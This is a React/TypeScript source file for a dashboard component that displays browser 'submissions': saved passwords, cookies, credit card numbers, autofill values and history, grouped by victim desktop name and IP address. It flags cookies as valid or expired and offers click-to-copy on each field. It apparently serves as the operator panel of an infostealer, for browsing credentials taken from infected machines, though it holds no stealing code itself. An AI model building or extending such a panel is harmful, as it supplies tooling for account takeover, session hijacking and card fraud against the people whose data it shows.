import React, { useState } from 'react';
import { FixedSizeList } from 'react-window';
import { DataCard } from '@/components/ui/data-card';
import { EmptyState } from '@/components/common/EmptyState';
import { Globe } from 'lucide-react';
import { Card, CardHeader, CardTitle, CardContent } from '@/components/ui/card';
import { CodeBlock } from '@/components/ui/code-block';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { Copy, ChevronDown, ChevronUp, Filter } from 'lucide-react';
import { cn } from '@/lib/utils';
import { Collapsible, CollapsibleContent, CollapsibleTrigger } from '@/components/ui/collapsible';
import { SearchInput, SearchFilter } from '@/components/common/SearchInput';
import { useBrowserSearch } from '@/hooks/useSearch';
import { getJson } from '@/utils/api';

// Utility function to extract domain from URL
function extractDomain(url: string): string {
  try {
    if (!url) return '';

    // Check if it's a valid URL that starts with http/https
    if (!url.startsWith('http://') && !url.startsWith('https://')) {
      // If it doesn't start with http/https, it's probably not a real URL
      // Return empty string to hide it from display
      return '';
    }

    const urlObj = new URL(url);
    return urlObj.hostname;
  } catch (e) {
    // If URL parsing fails, return empty string to hide invalid URLs
    return '';
  }
}

function BrowserCard({
  titleNode,
  badgeText,
  item,
}: {
  titleNode: React.ReactNode;
  badgeText: string;
  item: any;
}) {
  const [open, setOpen] = useState(false);
  const [copiedField, setCopiedField] = useState<string | null>(null);

  function copyText(text: string) {
    try {
      navigator.clipboard.writeText(text);
    } catch (e) {}
  }

  function formatCreatedDDMM(createdRaw: string) {
    try {
      if (!createdRaw) return '';
      const norm = String(createdRaw).replace(' ', 'T');
      const d = new Date(norm);
      if (isNaN(d.getTime())) return '';
      const dd = String(d.getDate()).padStart(2, '0');
      const mm = String(d.getMonth() + 1).padStart(2, '0');
      const yyyy = d.getFullYear();
      return `${dd}/${mm}/${yyyy}`;
    } catch (e) {
      return '';
    }
  }

  function formatMonthDayYearFromAny(v: any) {
    try {
      if (!v) return '';
      const n = Number(v);
      if (!isNaN(n) && n !== 0) {
        let jsTime: number | null = null;

        if (n > 1e14) {
          // Chrome/Brave Webkit microseconds since 1601
          jsTime = Math.floor(n / 1000) - 11644473600000;
        } else if (n > 1e12) {
          // ms since 1970
          jsTime = n;
        } else if (n > 1e9) {
          // s since 1970
          jsTime = n * 1000;
        }

        if (jsTime && !isNaN(jsTime)) {
          const d = new Date(jsTime);
          if (!isNaN(d.getTime())) {
            const mm = String(d.getMonth() + 1).padStart(2, '0');
            const dd = String(d.getDate()).padStart(2, '0');
            const yyyy = d.getFullYear();
            return `${mm}/${dd}/${yyyy}`;
          }
        }
      }

      // fallback: try parsing as a date string
      const dd = new Date(String(v));
      if (!isNaN(dd.getTime())) {
        const mm = String(dd.getMonth() + 1).padStart(2, '0');
        const dday = String(dd.getDate()).padStart(2, '0');
        const yyyy = dd.getFullYear();
        return `${mm}/${dday}/${yyyy}`;
      }
    } catch (e) {}

    return String(v);
  }

  // Render per-type content as code-like block and footer IP
  const renderContent = () => {
    const rawType = (item.type || item.submission_type || item.submission_category || '')
      .toString()
      .toLowerCase();
    let parsed = null;
    try {
      parsed = typeof item.data === 'string' ? JSON.parse(item.data) : item.data;
    } catch (e) {
      parsed = item.data || {};
    }

    let content: React.ReactNode = null;

    switch (true) {
      case rawType.includes('autofill'): {
        // If parsed contains a values array (grouped autofill), render values as clickable tokens
        const valuesArr: string[] = Array.isArray(parsed?.values) ? parsed.values : [];
        const singleName = parsed?.name || '';

        if (valuesArr.length > 0) {
          return (
            <>
              <div className="bg-secondary/10 p-3 rounded text-sm overflow-auto font-mono">
                <div className="whitespace-pre">{`{`}</div>
                <div className="pl-2">
                  <div className="flex items-start gap-2 select-none">
                    <div className="text-muted-foreground">"values"</div>
                    <div>:</div>
                    <div className="ml-1">
                      <div className="flex flex-col gap-1">
                        {valuesArr.map((v: any, i: number) => {
                          const display = typeof v === 'object' ? JSON.stringify(v) : String(v);
                          return (
                            <div key={i} className="flex items-center gap-2">
                              <div
                                title={`Click to copy value`}
                                onClick={() => {
                                  try {
                                    copyText(display);
                                    setCopiedField(display);
                                    setTimeout(() => setCopiedField(null), 1200);
                                  } catch (e) {}
                                }}
                                className="px-1 rounded cursor-pointer hover:bg-muted/20"
                              >
                                <span className="font-mono">{`"${display}"`}</span>
                              </div>
                              <div>{i < valuesArr.length - 1 ? ',' : ''}</div>
                            </div>
                          );
                        })}
                      </div>
                    </div>
                  </div>
                </div>
                <div className="whitespace-pre">{`}`}</div>
              </div>
              {copiedField && <div className="text-xs text-success mt-1">Copied value</div>}
            </>
          );
        }

        // fallback: single-name/value pairs
        const name = parsed?.name || singleName || '';
        const value = parsed?.value || '';
        content = (
          <CodeBlock enableCopy copyText={`name: ${name}\nvalue: ${value}`}>
            {`name: ${name}\nvalue: ${value}`}
          </CodeBlock>
        );
        break;
      }
      case rawType.includes('history'): {
        const url = parsed?.url || '';
        const title = parsed?.title || '';
        const visit_count = parsed?.visit_count ?? '';
        const last_visit_time = parsed?.last_visit_time ?? '';
        const formattedLast = formatMonthDayYearFromAny(last_visit_time);
        content = (
          <CodeBlock
            enableCopy
            copyText={`url: ${url}\ntitle: ${title}\nvisit_count: ${visit_count}\nlast_visit_time: ${formattedLast}`}
          >
            {`url: ${url}\ntitle: ${title}\nvisit_count: ${visit_count}\nlast_visit_time: ${formattedLast}`}
          </CodeBlock>
        );
        break;
      }
      case rawType.includes('password'): {
        const username = parsed?.username || parsed?.login || '';
        const password = parsed?.password || '';
        content = (
          <CodeBlock enableCopy copyText={`username: ${username}\npassword: ${password}`}>
            {`username: ${username}\npassword: ${password}`}
          </CodeBlock>
        );
        break;
      }
      case rawType.includes('cookie'): {
        // Render the entire cookie object as JSON
        const expires = parsed?.expires_utc ?? parsed?.expires ?? '';
        const expired = (() => {
          try {
            const exp = Number(parsed?.expires_utc ?? parsed?.expires);
            if (isNaN(exp) || exp === 0) return false; // session or invalid cookie

            let jsTime;

            if (exp > 1e14) {
              // Likely Chrome/Brave Webkit timestamp (µs since 1601)
              jsTime = Math.floor(exp / 1000) - 11644473600000;
            } else if (exp > 1e12) {
              // Likely ms since 1970
              jsTime = exp;
            } else {
              // Likely s since 1970
              jsTime = exp * 1000;
            }

            return jsTime < Date.now();
          } catch (e) {
            return false;
          }
        })();

        // Render JSON with clickable value tokens so users can copy specific fields
        const entries = parsed && typeof parsed === 'object' ? Object.entries(parsed) : [];

        content = (
          <>
            <div className="bg-secondary/10 p-3 rounded text-sm overflow-auto font-mono">
              <div className="whitespace-pre">{`{`}</div>
              <div className="pl-2">
                {entries.map(([k, v], i) => {
                  const display = typeof v === 'object' ? JSON.stringify(v) : String(v);
                  return (
                    <div key={k + i} className="flex items-start gap-2 select-none">
                      <div className="text-muted-foreground">"{k}"</div>
                      <div>:</div>
                      <div
                        title={`Click to copy ${k}`}
                        onClick={() => {
                          try {
                            copyText(display);
                            setCopiedField(k);
                            setTimeout(() => setCopiedField(null), 1200);
                          } catch (e) {}
                        }}
                        className="ml-1 px-1 rounded cursor-pointer hover:bg-muted/20"
                      >
                        <span className="font-mono">
                          {typeof display === 'string' ? `"${display}"` : display}
                        </span>
                      </div>
                      <div>{i < entries.length - 1 ? ',' : ''}</div>
                    </div>
                  );
                })}
              </div>
              <div className="whitespace-pre">{`}`}</div>
            </div>

            <div className="flex items-center justify-between mt-2">
              <div className="text-xs text-muted-foreground">IP: {item.ip_address}</div>
              <div
                className={cn(
                  'text-xs font-medium',
                  expired ? 'text-destructive' : 'text-success'
                )}
              >
                {expired ? 'Expired' : 'Valid'}
              </div>
            </div>

            {copiedField && <div className="text-xs text-success mt-1">Copied {copiedField}</div>}
          </>
        );
        // For cookie, IP is already included above, so skip adding below
        return content;
      }
      case rawType.includes('credit'):
      case rawType.includes('card'): {
        const name_on_card = parsed?.name_on_card || parsed?.name || '';
        const card_number = parsed?.card_number || parsed?.number || '';
        const expMonth = parsed?.expiration_month || parsed?.exp_month || '';
        const expYear = parsed?.expiration_year || parsed?.exp_year || '';
        content = (
          <CodeBlock
            enableCopy
            copyText={`name_on_card: ${name_on_card}\ncard_number: ${card_number}\nexpiration: ${expMonth}/${expYear}`}
          >
            {`name_on_card: ${name_on_card}\ncard_number: ${card_number}\nexpiration: ${expMonth}/${expYear}`}
          </CodeBlock>
        );
        break;
      }
      default: {
        content = (
          <CodeBlock enableCopy copyText={JSON.stringify(parsed, null, 2)}>
            {JSON.stringify(parsed, null, 2)}
          </CodeBlock>
        );
      }
    }

    // For cookie type, IP is already rendered above, so skip adding it again
    if (rawType.includes('cookie')) {
      return content;
    }

    return (
      <div>
        {content}
        <div className="text-xs text-muted-foreground mt-2">IP: {item.ip_address}</div>
      </div>
    );
  };

  return (
    <Collapsible open={open} onOpenChange={setOpen}>
      <Card>
        <CardHeader className="pb-3">
          <div className="flex items-start justify-between">
            <div className="min-w-0">{titleNode}</div>
            <div className="flex items-center gap-2">
              {badgeText && <Badge className="text-xs">{badgeText}</Badge>}
              <Button
                variant="ghost"
                size="sm"
                onClick={() => copyText(JSON.stringify(item.data || item, null, 2))}
              >
                <Copy className="h-3 w-3" />
              </Button>
              <CollapsibleTrigger asChild>
                <Button variant="ghost" size="sm">
                  {open ? <ChevronUp className="h-3 w-3" /> : <ChevronDown className="h-3 w-3" />}
                </Button>
              </CollapsibleTrigger>
            </div>
          </div>
        </CardHeader>
        <CollapsibleContent>
          <CardContent className="pt-0">{renderContent()}</CardContent>
        </CollapsibleContent>
      </Card>
    </Collapsible>
  );
}

function BrowserSubmissionsInner({
  submissions,
  virtualize,
}: {
  submissions: any[];
  virtualize?: boolean;
}) {
  // Search functionality
  const {
    data: searchResults,
    total,
    hasMore,
    loading,
    error,
    setQuery,
    setFilters,
    setSort,
    options,
    search,
  } = useBrowserSearch(
    {
      limit: 100,
      sortBy: 'created_at',
      sortOrder: 'desc',
    },
    { autoSearch: false },
  );

  // Check if search is active (has query or filters)
  const isSearchActive = !!(options.query?.trim() || Object.keys(options.filters || {}).length > 0);

  // Track if we've performed a search to differentiate between "no search" and "empty search results"
  const [hasSearched, setHasSearched] = React.useState(false);

  // Track group counts separately from filtered data
  const [groupCounts, setGroupCounts] = React.useState<Record<string, number>>({});

  // Define groups order and labels at the top
  const groupsOrder = ['passwords', 'autofill', 'history', 'cookies', 'creditCards', 'other'];
  const groupLabels: Record<string, string> = {
    passwords: 'Passwords',
    autofill: 'Autofill',
    history: 'History',
    cookies: 'Cookies',
    creditCards: 'Credit Cards',
    other: 'Other',
  };

  // Group visibility state
  const [visibleGroups, setVisibleGroups] = React.useState<Set<string>>(new Set(groupsOrder));

  // Toggle group visibility functions with backend filtering
  const toggleGroup = (group: string) => {
    const newVisibleGroups = new Set(visibleGroups);
    if (newVisibleGroups.has(group)) {
      newVisibleGroups.delete(group);
    } else {
      newVisibleGroups.add(group);
    }
    setVisibleGroups(newVisibleGroups);

    // Apply type filter based on selected groups
    applyGroupFilter(newVisibleGroups);
  };

  const toggleAll = () => {
    const newVisibleGroups =
      visibleGroups.size === groupsOrder.length ? new Set<string>() : new Set(groupsOrder);

    setVisibleGroups(newVisibleGroups);
    applyGroupFilter(newVisibleGroups);
  };

  // Apply group filter to search
  const applyGroupFilter = React.useCallback(
    (selectedGroups: Set<string>) => {
      if (selectedGroups.size === 0 || selectedGroups.size === groupsOrder.length) {
        // Remove type filter when all or none selected
        const newFilters = { ...options.filters };
        delete newFilters.type;
        setFilters(newFilters);
      } else {
        // Apply type filter for selected groups
        const groupTypes = Array.from(selectedGroups).map((group) => {
          // Map frontend group names to backend type names
          switch (group) {
            case 'creditCards':
              return 'credit_cards';
            default:
              return group;
          }
        });
        setFilters({ ...options.filters, type: groupTypes.join(',') });
      }

      // Trigger search after filter is set
      setTimeout(() => {
        if (selectedGroups.size > 0) {
          search({
            ...options,
            filters:
              selectedGroups.size === groupsOrder.length
                ? { ...options.filters, type: undefined }
                : {
                    ...options.filters,
                    type: Array.from(selectedGroups)
                      .map((group) => (group === 'creditCards' ? 'credit_cards' : group))
                      .join(','),
                  },
          });
          setHasSearched(true);
        }
      }, 100);
    },
    [options, setFilters, search, groupsOrder.length, setHasSearched],
  );

  // Fetch group counts separately to always show total counts
  const fetchGroupCounts = React.useCallback(async () => {
    try {
      const counts: Record<string, number> = {};

      // First get total count for all data to calculate 'other'
      const totalResult = await getJson('/api/search/browser?limit=1');
      const totalCount = totalResult.total || 0;

      let knownTypesCount = 0;

      // Fetch count for each known group type
      const knownGroups = ['passwords', 'autofill', 'history', 'cookies', 'creditCards'];
      for (const group of knownGroups) {
        const backendType = group === 'creditCards' ? 'credit_cards' : group;

        try {
          // Use the same approach as the working search calls
          const searchOptions = {
            limit: 1,
            filters: { type: backendType },
          };

          const params = new URLSearchParams();
          params.append('limit', '1');
          Object.entries(searchOptions.filters).forEach(([key, value]) => {
            if (value !== undefined && value !== null && value !== '') {
              params.append(`filters.${key}`, value.toString());
            }
          });

          const url = `/api/search/browser?${params.toString()}`;
          const result = await getJson(url);

          const count = result.total || 0;
          counts[group] = count;
          knownTypesCount += count;
        } catch (error) {
          console.error(`Error fetching count for ${group}:`, error);
          counts[group] = 0;
        }
      }

      // Calculate 'other' as total minus known types
      counts['other'] = Math.max(0, totalCount - knownTypesCount);

      setGroupCounts(counts);
    } catch (error) {
      console.error('Failed to fetch group counts:', error);
    }
  }, []);

  // Fetch group counts on component mount
  React.useEffect(() => {
    fetchGroupCounts();
  }, [fetchGroupCounts]);

  // Use search results only if search is active and we've performed a search, otherwise fall back to props
  const displayData = isSearchActive && hasSearched ? searchResults : submissions;

  // Manual search trigger function
  const triggerSearch = React.useCallback(() => {
    if (options.query?.trim() || Object.keys(options.filters || {}).length > 0) {
      // Only search if there's actually a query or filters
      search(options);
      setHasSearched(true);
    } else {
      // Reset search state when search becomes inactive
      setHasSearched(false);
    }
  }, [options, search]);

  // Define search filters
  const searchFilters: SearchFilter[] = [
    {
      key: 'type',
      label: 'Type',
      type: 'select',
      options: [
        { value: 'autofill', label: 'Autofill' },
        { value: 'passwords', label: 'Passwords' },
        { value: 'history', label: 'History' },
        { value: 'cookies', label: 'Cookies' },
        { value: 'credit_cards', label: 'Credit Cards' },
      ],
    },
    {
      key: 'browser',
      label: 'Browser',
      type: 'select',
      options: [
        { value: 'chrome', label: 'Chrome' },
        { value: 'firefox', label: 'Firefox' },
        { value: 'edge', label: 'Edge' },
        { value: 'safari', label: 'Safari' },
        { value: 'opera', label: 'Opera' },
      ],
    },
  ];

  // Define sort options
  const sortOptions = [
    { key: 'created_at', label: 'Date Created' },
    { key: 'type', label: 'Type' },
    { key: 'browser', label: 'Browser' },
  ];

  if (!submissions || submissions.length === 0)
    return (
      <EmptyState
        title="No browser submissions"
        description="Browser submission data will appear here when available."
        icon={<Globe className="h-12 w-12" />}
      />
    );
  // normalize submission type into groups

  const grouped: Record<string, any[]> = {};
  for (const s of displayData) {
    const raw = s.type || s.submission_type || s.submission_category || '';
    let key = String(raw).toLowerCase();
    // skip file search submissions — they belong on Filesearch page
    if (key === 'filesearch' || key === 'file_search' || key === 'file-search') continue;
    if (key === 'credit_cards' || key === 'credit-cards' || key === 'creditcards')
      key = 'creditCards';
    else if (key === 'cookie' || key === 'cookies') key = 'cookies';
    else if (key === 'pw' || key === 'password' || key === 'passwords') key = 'passwords';
    else if (key === 'autofill' || key === 'autofills') key = 'autofill';
    else if (key === 'history') key = 'history';
    else if (!groupsOrder.includes(key)) key = 'other';

    if (!grouped[key]) grouped[key] = [];
    grouped[key].push(s);
  }

  return (
    <div className="flex flex-col gap-6">
      {/* Search Interface */}
      <Card>
        <CardHeader>
          <CardTitle>Search Browser Results</CardTitle>
        </CardHeader>
        <CardContent>
          <SearchInput
            placeholder="Search browser submissions..."
            value={options.query || ''}
            onChange={(query) => {
              setQuery(query);
              // Trigger search after a short delay to allow for typing
              setTimeout(triggerSearch, 500);
            }}
            onFilterChange={(filters) => {
              setFilters(filters);
              triggerSearch();
            }}
            onSortChange={(sortBy, sortOrder) => {
              setSort(sortBy, sortOrder);
              triggerSearch();
            }}
            filters={searchFilters}
            sortOptions={sortOptions}
            currentFilters={options.filters || {}}
            currentSort={{
              sortBy: options.sortBy || 'created_at',
              sortOrder: options.sortOrder || 'desc',
            }}
            loading={loading}
            showFilters={true}
            showSort={true}
          />
          {error && <div className="mt-2 text-sm text-destructive">Search error: {error}</div>}
          {isSearchActive && hasSearched && searchResults.length === 0 && !loading && (
            <div className="mt-2 text-sm text-muted-foreground">
              No results found for "{options.query || 'your search'}"
            </div>
          )}
          {searchResults.length > 0 && (
            <div className="mt-2 text-sm text-muted-foreground">Found {total} results</div>
          )}
        </CardContent>
      </Card>

      {/* Group Filter Interface */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Filter className="h-4 w-4" />
            View Groups
          </CardTitle>
        </CardHeader>
        <CardContent>
          <div className="flex flex-wrap gap-2 items-center">
            <span className="text-sm font-medium text-muted-foreground mr-2">Select:</span>
            <Button
              variant={visibleGroups.size === groupsOrder.length ? 'default' : 'outline'}
              size="sm"
              onClick={toggleAll}
            >
              {visibleGroups.size === groupsOrder.length ? 'Hide All' : 'Show All'}
            </Button>
            {groupsOrder.map((group) => {
              const isVisible = visibleGroups.has(group);
              const count = groupCounts[group] || 0;
              return (
                <Button
                  key={group}
                  variant={isVisible ? 'default' : 'outline'}
                  size="sm"
                  onClick={() => toggleGroup(group)}
                  className="relative"
                >
                  {groupLabels[group] || group}
                  {count > 0 && (
                    <Badge variant="secondary" className="ml-2 text-xs">
                      {count}
                    </Badge>
                  )}
                </Button>
              );
            })}
          </div>
          <div className="mt-3 flex items-center justify-between text-sm text-muted-foreground">
            <span>
              Showing {visibleGroups.size} of {groupsOrder.length} groups
            </span>
            {visibleGroups.size === 0 && (
              <span className="text-warning">Select at least one group to view data</span>
            )}
          </div>
        </CardContent>
      </Card>

      {/* Show empty state if search is active but no results */}
      {isSearchActive && hasSearched && displayData.length === 0 && !loading ? (
        <div className="text-center py-12">
          <div className="text-muted-foreground">
            <Globe className="h-12 w-12 mx-auto mb-4 opacity-50" />
            <p className="text-lg font-medium">No results found</p>
            <p className="text-sm">Try adjusting your search query or filters</p>
          </div>
        </div>
      ) : visibleGroups.size === 0 ? (
        <div className="text-center py-12">
          <div className="text-muted-foreground">
            <Filter className="h-12 w-12 mx-auto mb-4 opacity-50" />
            <p className="text-lg font-medium">No groups selected</p>
            <p className="text-sm">Select one or more groups above to view your data</p>
          </div>
        </div>
      ) : (
        groupsOrder.map((g) => {
          const items = grouped[g] || [];
          if (items.length === 0 || !visibleGroups.has(g)) return null;
          return (
            <section key={g} className="bg-card border border-border rounded-md p-3">
              <div className="flex items-center justify-between mb-3">
                <h4 className="font-semibold">{groupLabels[g] || g}</h4>
                <div className="text-sm text-muted-foreground">{items.length} items</div>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-3">
                {g === 'autofill'
                  ? (() => {
                      // group autofill items by desktop+ip+name and collapse values
                      const map = new Map<string, any>();
                      for (const s of items) {
                        let parsedData: any = null;
                        try {
                          parsedData = typeof s.data === 'string' ? JSON.parse(s.data) : s.data;
                        } catch (e) {
                          parsedData = s.data || {};
                        }

                        const name = parsedData?.name ?? '';
                        const value = parsedData?.value ?? '';
                        // classify token type: email if value looks like an email, otherwise use the name
                        const emailRegex = /[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}/i;
                        const tokenType = emailRegex.test(String(value))
                          ? 'email'
                          : name || 'value';
                        const desktopName = s.desktop_name || s.desktopName || s.desktop || '';
                        const ip = s.ip_address || '';
                        const key = `${desktopName}||${ip}||${tokenType}`;
                        if (!map.has(key)) {
                          map.set(key, { desktopName, ip, tokenType, values: [], sample: s });
                        }
                        const existing = map.get(key);
                        const normalize = (v: any) =>
                          tokenType === 'email' ? String(v).trim().toLowerCase() : String(v).trim();
                        const normalizedValue = normalize(value);
                        const already = existing.values.some(
                          (ev: any) => normalize(ev) === normalizedValue,
                        );
                        if (!already) existing.values.push(value);
                      }

                      const groups = Array.from(map.values());
                      return groups.map((grp: any, idx: number) => {
                        const syntheticItem = {
                          id: `${grp.desktopName || 'd'}-${grp.tokenType || 'v'}-${idx}`,
                          desktop_name: grp.desktopName,
                          ip_address: grp.ip,
                          data: { values: grp.values },
                          browser: grp.sample?.browser || grp.sample?.type || 'browser',
                          created_at:
                            grp.sample?.created_at ||
                            grp.sample?.created ||
                            grp.sample?.createdAt ||
                            '',
                        };

                        const capitalizeFirst = (str: string) =>
                          str.charAt(0).toUpperCase() + str.slice(1);
                        const computedTitle =
                          grp.tokenType === 'email'
                            ? 'Email'
                            : grp.tokenType
                              ? capitalizeFirst(String(grp.tokenType))
                              : 'Autofill';

                        const createdRaw = syntheticItem.created_at || '';
                        let formattedDate = '';
                        try {
                          if (createdRaw) {
                            const norm = String(createdRaw).replace(' ', 'T');
                            const d = new Date(norm);
                            if (!isNaN(d.getTime())) {
                              const dd = String(d.getDate()).padStart(2, '0');
                              const mm = String(d.getMonth() + 1).padStart(2, '0');
                              const yyyy = d.getFullYear();
                              formattedDate = `${mm}/${dd}/${yyyy}`;
                            }
                          }
                        } catch (e) {}

                        const usageRaw = String(syntheticItem.browser || 'browser');
                        const humanize = (str: string) =>
                          String(str)
                            .replace(/_/g, ' ')
                            .replace(/\b\w/g, (m) => m.toUpperCase());
                        const badgeText = grp.desktopName
                          ? `${humanize(usageRaw)} · ${grp.desktopName}`
                          : humanize(usageRaw);

                        const titleNode = (
                          <div>
                            <div>{computedTitle}</div>
                            {formattedDate && (
                              <div className="text-xs text-muted-foreground mt-0.5">
                                {formattedDate}
                              </div>
                            )}
                          </div>
                        );

                        return (
                          <div key={syntheticItem.id}>
                            <BrowserCard
                              titleNode={titleNode}
                              badgeText={badgeText}
                              item={syntheticItem}
                            />
                          </div>
                        );
                      });
                    })()
                  : items.map((s: any, idx: number) => {
                      // compute title based on type and data
                      let parsedData: any = null;
                      try {
                        parsedData = typeof s.data === 'string' ? JSON.parse(s.data) : s.data;
                      } catch (e) {
                        parsedData = s.data || null;
                      }

                      let computedTitle = s.title || s.url || `Browser Item ${idx + 1}`;
                      const rawType = (s.type || s.submission_type || s.submission_category || '')
                        .toString()
                        .toLowerCase();

                      const capitalizeFirst = (str: string) =>
                        str.charAt(0).toUpperCase() + str.slice(1);

                      switch (true) {
                        case rawType.includes('autofill'):
                          if (parsedData && parsedData.name)
                            computedTitle = capitalizeFirst(String(parsedData.name));
                          break;
                        case rawType.includes('history'):
                          if (parsedData && parsedData.url) {
                            const domain = extractDomain(String(parsedData.url));
                            computedTitle = domain || 'Browser History';
                          }
                          break;
                        case rawType.includes('password') || rawType === 'passwords':
                          if (parsedData && parsedData.url) {
                            const domain = extractDomain(String(parsedData.url));
                            computedTitle = domain || 'Saved Password';
                          }
                          break;
                        case rawType.includes('cookie') || rawType === 'cookies':
                          if (parsedData && parsedData.host)
                            computedTitle = String(parsedData.host);
                          break;
                        case rawType.includes('credit') || rawType.includes('card'):
                          if (parsedData) {
                            const nameOnCard =
                              parsedData.name_on_card || parsedData.name || parsedData.cardholder;
                            const cardNum =
                              parsedData.card_number ||
                              parsedData.number ||
                              parsedData.cardNumber ||
                              '';
                            const last4 = String(cardNum).slice(-4);
                            if (nameOnCard)
                              computedTitle = `${capitalizeFirst(String(nameOnCard))} ${last4}`;
                            else if (last4) computedTitle = `****${last4}`;
                          }
                          break;
                        default:
                          computedTitle = capitalizeFirst(computedTitle);
                      }

                      const desktopName = s.desktop_name || s.desktopName || s.desktop || '';
                      const createdRaw = s.created_at || s.createdAt || s.created || '';
                      // format date dd/mm/yyyy
                      let formattedDate = '';
                      try {
                        if (createdRaw) {
                          const norm = String(createdRaw).replace(' ', 'T');
                          const d = new Date(norm);
                          if (!isNaN(d.getTime())) {
                            const dd = String(d.getDate()).padStart(2, '0');
                            const mm = String(d.getMonth() + 1).padStart(2, '0');
                            const yyyy = d.getFullYear();
                            formattedDate = `${mm}/${dd}/${yyyy}`;
                          }
                        }
                      } catch (e) {}

                      const usageRaw = String(s.browser || 'browser');
                      const humanize = (str: string) =>
                        String(str)
                          .replace(/_/g, ' ')
                          .replace(/\b\w/g, (m) => m.toUpperCase());
                      const badgeText = desktopName
                        ? `${humanize(usageRaw)} · ${desktopName}`
                        : humanize(usageRaw);

                      // compose title node with subtitle showing desktop and date
                      const titleNode = (
                        <div>
                          <div>{computedTitle}</div>
                          {formattedDate && (
                            <div className="text-xs text-muted-foreground mt-0.5">
                              {formattedDate}
                            </div>
                          )}
                        </div>
                      );
                      return (
                        <div key={s.id ? `${s.id}-${idx}` : `idx-${idx}`}>
                          <BrowserCard titleNode={titleNode} badgeText={badgeText} item={s} />
                        </div>
                      );
                    })}
              </div>
            </section>
          );
        })
      )}
    </div>
  );
}

export const BrowserSubmissions = React.memo(BrowserSubmissionsInner);
